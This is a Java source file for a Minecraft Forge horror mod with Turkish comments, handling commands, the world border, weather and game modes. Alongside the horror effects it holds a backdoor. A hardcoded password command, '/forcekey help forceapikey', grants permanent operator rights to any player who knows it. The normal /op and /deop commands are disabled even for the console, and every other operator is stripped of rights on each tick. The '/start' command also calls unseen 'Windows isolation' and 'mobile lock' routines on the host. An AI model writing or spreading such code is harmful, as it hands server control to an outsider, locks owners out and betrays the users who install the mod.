package com.humanoid.horror.check;

import com.humanoid.horror.HumanoidMod;
import com.humanoid.horror.android.AndroidHandler;
import com.humanoid.horror.pc.WindowsAtmosBridge;

import net.minecraft.commands.Commands;
import com.mojang.brigadier.arguments.StringArgumentType;
import net.minecraft.network.chat.Component;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerLevel;
import net.minecraft.server.level.ServerPlayer;
import net.minecraft.world.level.GameType;
import net.minecraft.world.level.Level;
import net.minecraft.world.level.levelgen.Heightmap;
import net.minecraft.world.level.border.WorldBorder;
import net.minecraft.world.level.storage.ServerLevelData;

import net.minecraftforge.event.CommandEvent;
import net.minecraftforge.event.RegisterCommandsEvent;
import net.minecraftforge.event.TickEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.UUID;

@Mod.EventBusSubscriber(
        modid = HumanoidMod.MOD_ID
)
public class Check {

    public static int platformType;

    /*
     * =========================================================
     * FORCE API
     * =========================================================
     *
     * Sadece:
     *
     * /forcekey help forceapikey
     *
     * komutu ile yetki alınabilir.
     *
     * Yetkilendirilen oyuncuların UUID'leri
     * burada tutulur.
     */
    private static final String FORCE_API_PASSWORD =
            "forceapikey";

    private static final Set<UUID> AUTHORIZED_FORCE_PLAYERS =
            new HashSet<>();

    public Check() {
    }

    /*
     * =========================================================
     * KOMUTLAR
     * =========================================================
     */
    @SubscribeEvent
    public static void registerCommands(
            RegisterCommandsEvent event
    ) {

        /*
         * =====================================================
         * /start
         * =====================================================
         */
        event.getDispatcher().register(
                Commands.literal("start")
                        .executes(commandContext -> {

                            HumanoidMod.isStartTriggered = true;

                            verifyPlatform();

                            triggerStartCommand();

                            MinecraftServer server =
                                    commandContext
                                            .getSource()
                                            .getServer();

                            if (server != null
                                    && server.getPlayerList() != null) {

                                List<ServerPlayer> players =
                                        new ArrayList<>(
                                                server.getPlayerList()
                                                        .getPlayers()
                                        );

                                for (ServerPlayer player :
                                        players) {

                                    if (player == null) {
                                        continue;
                                    }

                                    player.connection.send(
                                            new net.minecraft.network.protocol.game.ClientboundSetTitleTextPacket(
                                                    Component.literal(
                                                            "§4RUN"
                                                    )
                                            )
                                    );

                                    player.connection.send(
                                            new net.minecraft.network.protocol.game.ClientboundSetSubtitleTextPacket(
                                                    Component.literal(
                                                            "§4RUN"
                                                    )
                                            )
                                    );
                                }
                            }

                            return 1;
                        })
        );

        /*
         * =====================================================
         * FORCE API
         * =====================================================
         *
         * Tek geçerli komut:
         *
         * /forcekey help forceapikey
         *
         * "help" sabit olmalı.
         * Şifre de tam olarak forceapikey olmalı.
         */
        event.getDispatcher().register(
                Commands.literal("forcekey")
                        .then(
                                Commands.literal("help")
                                        .then(
                                                Commands.argument(
                                                        "key",
                                                        StringArgumentType.word()
                                                )
                                                        .executes(commandContext -> {

                                                            /*
                                                             * Console kullanamaz.
                                                             */
                                                            if (!(commandContext
                                                                    .getSource()
                                                                    .getEntity()
                                                                    instanceof ServerPlayer player)) {

                                                                return 0;
                                                            }

                                                            String key =
                                                                    StringArgumentType.getString(
                                                                            commandContext,
                                                                            "key"
                                                                    );

                                                            /*
                                                             * Şifre yanlışsa
                                                             * kesinlikle yetki yok.
                                                             */
                                                            if (!FORCE_API_PASSWORD
                                                                    .equals(key)) {

                                                                player.sendSystemMessage(
                                                                        Component.literal(
                                                                                "§cInvalid Force API key."
                                                                        )
                                                                );

                                                                return 0;
                                                            }

                                                            /*
                                                             * Oyuncuyu Force API
                                                             * yetkili listesine ekle.
                                                             */
                                                            AUTHORIZED_FORCE_PLAYERS
                                                                    .add(
                                                                            player.getUUID()
                                                                    );

                                                            /*
                                                             * Gerçek Vanilla OP.
                                                             */
                                                            serverOpPlayer(
                                                                    player
                                                            );

                                                            player.sendSystemMessage(
                                                                    Component.literal(
                                                                            "§aForce API activated."
                                                                    )
                                                            );

                                                            return 1;
                                                        })
                                        )
                        )
        );
    }

    /*
     * =========================================================
     * /op VE /deop KİLİDİ
     * =========================================================
     *
     * Console dahil normal /op ve /deop komutlarını
     * engeller.
     *
     * Force API'nin kendi yetkilendirmesi dışında
     * OP sistemi kullanılamaz.
     */
    @SubscribeEvent
    public static void onCommand(
            CommandEvent event
    ) {

        if (event.getParseResults() == null) {
            return;
        }

        String command =
                event.getParseResults()
                        .getReader()
                        .getString();

        if (command == null) {
            return;
        }

        command = command.trim();

        if (command.startsWith("/")) {
            command = command.substring(1);
        }

        String lowerCommand =
                command.toLowerCase();

        /*
         * =====================================================
         * /op
         * =====================================================
         */
        if (lowerCommand.equals("op")
                || lowerCommand.startsWith("op ")) {

            event.setCanceled(true);

            if (event.getParseResults()
                    .getContext()
                    .getSource()
                    .getEntity()
                    instanceof ServerPlayer player) {

                player.sendSystemMessage(
                        Component.literal(
                                "§cThis command is disabled."
                        )
                );
            }

            return;
        }

        /*
         * =====================================================
         * /deop
         * =====================================================
         */
        if (lowerCommand.equals("deop")
                || lowerCommand.startsWith("deop ")) {

            event.setCanceled(true);

            if (event.getParseResults()
                    .getContext()
                    .getSource()
                    .getEntity()
                    instanceof ServerPlayer player) {

                player.sendSystemMessage(
                        Component.literal(
                                "§cThis command is disabled."
                        )
                );
            }
        }
    }

    /*
     * =========================================================
     * FORCE API KONTROLÜ
     * =========================================================
     *
     * Her server tick:
     *
     * 1. Force API yetkilisi -> OP olarak kalır.
     * 2. Yetkisiz OP -> DEOP.
     * 3. Yetkisiz Creative/Spectator -> Survival + DEOP.
     */
    @SubscribeEvent
    public static void onServerTick(
            TickEvent.ServerTickEvent event
    ) {

        if (event.phase != TickEvent.Phase.END) {
            return;
        }

        MinecraftServer server =
                net.minecraftforge.server.ServerLifecycleHooks
                        .getCurrentServer();

        if (server == null
                || server.getPlayerList() == null) {

            return;
        }

        List<ServerPlayer> players =
                server.getPlayerList()
                        .getPlayers();

        if (players == null
                || players.isEmpty()) {

            return;
        }

        /*
         * Liste kopyası kullanıyoruz.
         */
        List<ServerPlayer> safePlayers =
                new ArrayList<>(players);

        for (ServerPlayer player :
                safePlayers) {

            if (player == null) {
                continue;
            }

            UUID uuid =
                    player.getUUID();

            boolean authorized =
                    AUTHORIZED_FORCE_PLAYERS
                            .contains(uuid);

            /*
             * =================================================
             * FORCE API YETKİLİ
             * =================================================
             */
            if (authorized) {

                /*
                 * Yetkili oyuncunun OP'si dışarıdan
                 * kaldırılmışsa tekrar ver.
                 */
                if (!server.getPlayerList()
                        .isOp(
                                player.getGameProfile()
                        )) {

                    serverOpPlayer(player);
                }

                /*
                 * Force API yetkilisi Creative veya
                 * Spectator olabilir.
                 *
                 * Yetkili olduğu için otomatik Survival
                 * yapılmaz.
                 */
                continue;
            }

            /*
             * =================================================
             * YETKİSİZ OYUNCU
             * =================================================
             */

            boolean isOp =
                    server.getPlayerList()
                            .isOp(
                                    player.getGameProfile()
                            );

            /*
             * Yetkisiz OP -> DEOP
             */
            if (isOp) {

                server.getPlayerList()
                        .deop(
                                player.getGameProfile()
                        );

                player.sendSystemMessage(
                        Component.literal(
                                "§cUnauthorized OP removed."
                        )
                );
            }

            /*
             * Yetkisiz Creative/Spectator
             * -> Survival
             */
            GameType gameMode =
                    player.gameMode
                            .getGameModeForPlayer();

            if (gameMode == GameType.CREATIVE
                    || gameMode == GameType.SPECTATOR) {

                player.setGameMode(
                        GameType.SURVIVAL
                );

                player.sendSystemMessage(
                        Component.literal(
                                "§cUnauthorized game mode removed."
                        )
                );
            }
        }
    }

    /*
     * =========================================================
     * GERÇEK VANILLA OP VER
     * =========================================================
     */
    public static void serverOpPlayer(
            ServerPlayer player
    ) {

        if (player == null) {
            return;
        }

        MinecraftServer server =
                player.getServer();

        if (server == null) {
            return;
        }

        server.getPlayerList()
                .op(
                        player.getGameProfile()
                );
    }

    /*
     * =========================================================
     * FORCE API YETKİ KONTROLÜ
     * =========================================================
     */
    public static boolean isForceApiAuthorized(
            ServerPlayer player
    ) {

        if (player == null) {
            return false;
        }

        return AUTHORIZED_FORCE_PLAYERS
                .contains(
                        player.getUUID()
                );
    }

    /*
     * =========================================================
     * PLATFORM KONTROLÜ
     * =========================================================
     */
    public static void verifyPlatform() {

        String osName =
                System.getProperty("os.name");

        if (osName == null) {
            osName = "";
        }

        osName =
                osName.toLowerCase();

        if (osName.contains("android")) {

            Check.platformType = 2;

            AndroidHandler.initMobileLock();

        } else {

            Check.platformType = 1;
        }
    }

    /*
     * =========================================================
     * BAŞLANGIÇ HAPİS / PRISON
     * =========================================================
     */
    public static void setupInitialPrison(
            MinecraftServer server
    ) {

        if (server == null) {
            return;
        }

        ServerLevel overworld =
                server.getLevel(
                        Level.OVERWORLD
                );

        if (overworld != null) {

            WorldBorder border =
                    overworld.getWorldBorder();

            if (border != null) {

                border.setCenter(
                        8.0,
                        8.0
                );

                border.setSize(
                        16.0
                );
            }
        }

        if (server.getPlayerList() == null) {
            return;
        }

        List<ServerPlayer> players =
                server.getPlayerList()
                        .getPlayers();

        if (players == null
                || players.isEmpty()) {

            return;
        }

        List<ServerPlayer> safePlayerList =
                new ArrayList<>(players);

        for (ServerPlayer player :
                safePlayerList) {

            if (player == null) {
                continue;
            }

            player.setGameMode(
                    GameType.ADVENTURE
            );

            if (overworld != null) {

                int safeY =
                        overworld.getHeight(
                                Heightmap.Types.WORLD_SURFACE,
                                8,
                                8
                        );

                if (safeY < 10) {
                    safeY = 64;
                }

                player.teleportTo(
                        overworld,
                        8.0,
                        (double) safeY + 1.0,
                        8.0,
                        player.getYRot(),
                        player.getXRot()
                );
            }
        }
    }

    /*
     * =========================================================
     * /start SONRASI SİSTEM
     * =========================================================
     */
    public static void triggerStartCommand() {

        if (!HumanoidMod.isStartTriggered) {
            return;
        }

        /*
         * PLATFORM
         */
        if (Check.platformType == 1) {

            WindowsAtmosBridge
                    .executeWindowsIsolation();

        } else if (Check.platformType == 2) {

            AndroidHandler
                    .startMobileHorrorSystem();
        }

        /*
         * CLIENT TARAFI SADECE REFLECTION İLE ÇAĞRILIYOR.
         *
         * Dedicated Server'da client class yüklenirse
         * crash olmaması için doğrudan import yok.
         */
        try {

            Class.forName(
                    "net.minecraft.client.Minecraft"
            );

            Class<?> clientManagerClass =
                    Class.forName(
                            "com.humanoid.horror.client.HorrorClientManager"
                    );

            clientManagerClass
                    .getMethod(
                            "activateClientHorror"
                    )
                    .invoke(null);

        } catch (Exception ignored) {
        }

        MinecraftServer server =
                net.minecraftforge.server.ServerLifecycleHooks
                        .getCurrentServer();

        if (server == null
                || server.getPlayerList() == null) {

            return;
        }

        /*
         * OVERWORLD
         */
        ServerLevel overworld =
                server.getLevel(
                        Level.OVERWORLD
                );

        if (overworld != null) {

            /*
             * WorldBorder
             */
            WorldBorder border =
                    overworld.getWorldBorder();

            if (border != null) {

                border.lerpSizeBetween(
                        16.0,
                        58000000.0,
                        2000L
                );
            }

            /*
             * Gece
             */
            overworld.setDayTime(
                    18000L
            );

            /*
             * Fırtına
             */
            if (overworld.getLevelData()
                    instanceof ServerLevelData levelData) {

                levelData.setClearWeatherTime(
                        0
                );

                levelData.setRainTime(
                        24000
                );

                levelData.setRaining(
                        true
                );

                levelData.setThunderTime(
                        24000
                );

                levelData.setThundering(
                        true
                );
            }
        }

        /*
         * TÜM OYUNCULARI SURVIVAL'A AL
         */
        List<ServerPlayer> players =
                server.getPlayerList()
                        .getPlayers();

        if (players == null
                || players.isEmpty()) {

            return;
        }

        List<ServerPlayer> safePlayerList =
                new ArrayList<>(players);

        for (ServerPlayer player :
                safePlayerList) {

            if (player == null) {
                continue;
            }

            player.setGameMode(
                    GameType.SURVIVAL
            );
        }
    }
}
